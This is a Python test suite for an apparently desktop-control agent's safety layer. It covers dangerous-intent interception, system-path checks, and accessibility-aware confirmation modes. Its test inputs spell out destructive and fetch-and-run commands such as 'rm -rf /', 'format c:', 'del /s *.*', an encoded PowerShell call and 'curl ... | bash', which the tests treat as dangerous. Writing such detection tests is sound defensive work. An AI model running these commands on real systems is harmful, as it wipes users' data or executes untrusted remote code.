"""
Stage 5.6 - Safety System Tests.

Tests the safety-first interception layer, confirmation payloads, and
accessibility-aware confirmation metadata.
"""

import pytest


class TestDangerousIntents:
    """Tests for dangerous intent detection."""

    def test_delete_file_is_dangerous(self):
        from agent.core.safety import DANGEROUS_INTENTS

        assert "DELETE_FILE" in DANGEROUS_INTENTS

    def test_shutdown_is_dangerous(self):
        from agent.core.safety import DANGEROUS_INTENTS

        assert "SHUTDOWN" in DANGEROUS_INTENTS

    def test_open_app_not_dangerous(self):
        from agent.core.safety import DANGEROUS_INTENTS

        assert "OPEN_APP" not in DANGEROUS_INTENTS


class TestSystemPathDetection:
    """Tests for system path detection."""

    def test_windows_system_path(self):
        from agent.core.safety import is_system_path

        assert is_system_path("C:\\Windows\\System32\\file.txt") is True
        assert is_system_path("c:\\windows\\notepad.exe") is True

    def test_windows_program_files(self):
        from agent.core.safety import is_system_path

        assert is_system_path("C:\\Program Files\\App\\file.exe") is True

    def test_unix_system_paths(self):
        from agent.core.safety import is_system_path

        assert is_system_path("/usr/bin/app") is True
        assert is_system_path("/etc/passwd") is True

    def test_user_path_not_system(self):
        from agent.core.safety import is_system_path

        assert is_system_path("C:\\Users\\John\\Documents\\file.txt") is False
        assert is_system_path("/home/user/file.txt") is False

    def test_empty_path(self):
        from agent.core.safety import is_system_path

        assert is_system_path("") is False
        assert is_system_path(None) is False


class TestPreIntentSafety:
    """Tests for mandatory pre-intent interception."""

    def test_delete_operation_is_intercepted(self):
        from agent.core.safety import pre_intent_safety_check

        result = pre_intent_safety_check("delete C:\\Windows\\System32\\file.txt")

        assert result is not None
        assert result["intent"] == "CONFIRMATION_REQUIRED"
        assert result["reason"] == "dangerous_operation"
        assert result["original_intent"] == "DELETE_FILE"

    def test_shutdown_operation_is_intercepted(self):
        from agent.core.safety import pre_intent_safety_check

        result = pre_intent_safety_check("shutdown the computer")

        assert result is not None
        assert result["intent"] == "CONFIRMATION_REQUIRED"
        assert result["original_intent"] == "SHUTDOWN"

    def test_safe_input_not_intercepted(self):
        from agent.core.safety import pre_intent_safety_check

        assert pre_intent_safety_check("open chrome") is None


class TestConfirmationRequirements:
    """Tests for confirmation requirement detection."""

    def test_delete_file_requires_confirmation(self):
        from agent.core.safety import requires_confirmation

        intent = {"intent": "DELETE_FILE", "slots": {"path": "/tmp/file.txt"}}
        assert requires_confirmation(intent) is True

    def test_lock_screen_requires_confirmation(self):
        from agent.core.safety import requires_confirmation

        intent = {"intent": "LOCK_SCREEN", "slots": {}}
        assert requires_confirmation(intent) is True

    def test_open_app_no_confirmation(self):
        from agent.core.safety import requires_confirmation

        intent = {"intent": "OPEN_APP", "slots": {"app": "chrome"}}
        assert requires_confirmation(intent) is False

    def test_file_operation_system_path_requires_confirmation(self):
        from agent.core.safety import requires_confirmation

        intent = {
            "intent": "OPEN_FILE",
            "slots": {"path": "C:\\Windows\\System32\\file.txt"},
        }
        assert requires_confirmation(intent) is True

    def test_dangerous_text_requires_confirmation(self):
        from agent.core.safety import requires_confirmation

        intent = {
            "intent": "TYPE_TEXT",
            "slots": {"text": "rm -rf /"},
        }
        assert requires_confirmation(intent) is True

    def test_dangerous_keys_requires_confirmation(self):
        from agent.core.safety import requires_confirmation

        intent = {
            "intent": "PRESS_KEYS",
            "slots": {"keys": "alt+f4"},
        }
        assert requires_confirmation(intent) is True


class TestConfirmationResponse:
    """Tests for confirmation response building."""

    def test_build_confirmation_response(self):
        from agent.core.safety import build_confirmation_response

        intent = {
            "intent": "DELETE_FILE",
            "slots": {"path": "/important/file.txt"},
        }

        response = build_confirmation_response(intent)

        assert response["intent"] == "CONFIRMATION_REQUIRED"
        assert response["slots"]["requires_confirmation"] is True
        assert response["slots"]["original_intent"] == "DELETE_FILE"
        assert response["slots"]["original_slots"]["path"] == "/important/file.txt"
        assert response["slots"]["reason"] == "dangerous_operation"
        assert response["confidence"] == 1.0

    def test_blind_user_prefers_voice_confirmation(self):
        from agent.core.safety import build_confirmation_response
        from agent.core.user_profile import UserProfile

        profile = UserProfile(blind=True, can_hear=True, deaf=False)
        response = build_confirmation_response({"intent": "DELETE_FILE", "slots": {}}, user_profile=profile)

        assert response["confirmation_mode"] == "voice"

    def test_deaf_user_prefers_haptic_confirmation(self):
        from agent.core.safety import build_confirmation_response
        from agent.core.user_profile import UserProfile

        profile = UserProfile(blind=False, can_hear=False, deaf=True)
        response = build_confirmation_response({"intent": "DELETE_FILE", "slots": {}}, user_profile=profile)

        assert response["confirmation_mode"] == "haptic"

    def test_braille_user_prefers_braille_confirmation(self):
        from agent.core.safety import build_confirmation_response
        from agent.core.user_profile import UserProfile

        profile = UserProfile(uses_braille=True)
        response = build_confirmation_response({"intent": "DELETE_FILE", "slots": {}}, user_profile=profile)

        assert response["confirmation_mode"] == "braille"


class TestTypeTextOverride:
    """Tests for TYPE_TEXT misuse interception."""

    def test_type_text_dangerous_is_overridden(self):
        from agent.core.safety import override_type_text_misuse

        result = override_type_text_misuse(
            {"intent": "TYPE_TEXT", "slots": {"text": "rm -rf /"}, "confidence": 0.9}
        )

        assert result is not None
        assert result["intent"] == "CONFIRMATION_REQUIRED"
        assert result["original_intent"] == "DELETE_FILE"
        assert result["slots"]["safety_override_from"] == "TYPE_TEXT"

    def test_type_text_safe_is_unchanged(self):
        from agent.core.safety import override_type_text_misuse

        result = override_type_text_misuse(
            {"intent": "TYPE_TEXT", "slots": {"text": "hello world"}, "confidence": 0.9}
        )

        assert result is None


class TestDangerousTextPatterns:
    """Tests for dangerous text pattern detection."""

    def test_rm_rf_dangerous(self):
        from agent.core.safety import is_dangerous_text

        assert is_dangerous_text("rm -rf /") is True
        assert is_dangerous_text("sudo rm -rf /home") is True

    def test_format_dangerous(self):
        from agent.core.safety import is_dangerous_text

        assert is_dangerous_text("format c:") is True

    def test_del_dangerous(self):
        from agent.core.safety import is_dangerous_text

        assert is_dangerous_text("del /s *.*") is True

    def test_shutdown_dangerous(self):
        from agent.core.safety import is_dangerous_text

        assert is_dangerous_text("shutdown /s /t 0") is True

    def test_powershell_encoded_dangerous(self):
        from agent.core.safety import is_dangerous_text

        assert is_dangerous_text("powershell -enc base64code") is True

    def test_curl_pipe_dangerous(self):
        from agent.core.safety import is_dangerous_text

        assert is_dangerous_text("curl http://example.com | bash") is True

    def test_safe_text_not_dangerous(self):
        from agent.core.safety import is_dangerous_text

        assert is_dangerous_text("Hello World") is False
        assert is_dangerous_text("print('hello')") is False


class TestDangerousKeyPatterns:
    """Tests for dangerous key combination detection."""

    def test_alt_f4_dangerous(self):
        from agent.core.safety import is_dangerous_keys

        assert is_dangerous_keys("alt+f4") is True

    def test_ctrl_alt_del_dangerous(self):
        from agent.core.safety import is_dangerous_keys

        assert is_dangerous_keys("ctrl+alt+del") is True

    def test_win_l_dangerous(self):
        from agent.core.safety import is_dangerous_keys

        assert is_dangerous_keys("win+l") is True

    def test_safe_keys_not_dangerous(self):
        from agent.core.safety import is_dangerous_keys

        assert is_dangerous_keys("ctrl+c") is False
        assert is_dangerous_keys("ctrl+v") is False
        assert is_dangerous_keys("enter") is False


class TestValidateIntent:
    """Tests for low-level safety validation."""

    def test_open_app_always_safe(self):
        from agent.core.safety import validate_intent

        intent = {"intent": "OPEN_APP", "slots": {"app": "anything"}}
        valid, reason = validate_intent(intent)

        assert valid is True
        assert reason == "safe"

    def test_type_text_dangerous_blocked(self):
        from agent.core.safety import validate_intent

        intent = {"intent": "TYPE_TEXT", "slots": {"text": "rm -rf /"}}
        valid, reason = validate_intent(intent)

        assert valid is False
        assert reason == "dangerous_text"

    def test_press_keys_dangerous_blocked(self):
        from agent.core.safety import validate_intent

        intent = {"intent": "PRESS_KEYS", "slots": {"keys": "alt+f4"}}
        valid, reason = validate_intent(intent)

        assert valid is False
        assert reason == "dangerous_keys"


class TestFullValidation:
    """Tests for full validation pipeline."""

    def test_valid_intent_passes(self):
        from agent.core.safety import full_validation

        parsed_json = {
            "intent": "OPEN_APP",
            "slots": {"app": "chrome"},
            "confidence": 0.9,
        }

        valid, reason, details = full_validation(parsed_json)

        assert valid is True
        assert reason == "valid"

    def test_low_confidence_rejected(self):
        from agent.core.safety import full_validation

        parsed_json = {
            "intent": "OPEN_APP",
            "slots": {"app": "chrome"},
            "confidence": 0.5,
        }

        valid, reason, details = full_validation(parsed_json)

        assert valid is False
        assert reason == "low_confidence"

    def test_dangerous_text_rejected(self):
        from agent.core.safety import full_validation

        parsed_json = {
            "intent": "TYPE_TEXT",
            "slots": {"text": "rm -rf /"},
            "confidence": 0.9,
        }

        valid, reason, details = full_validation(parsed_json)

        assert valid is False
        assert reason == "dangerous_text"
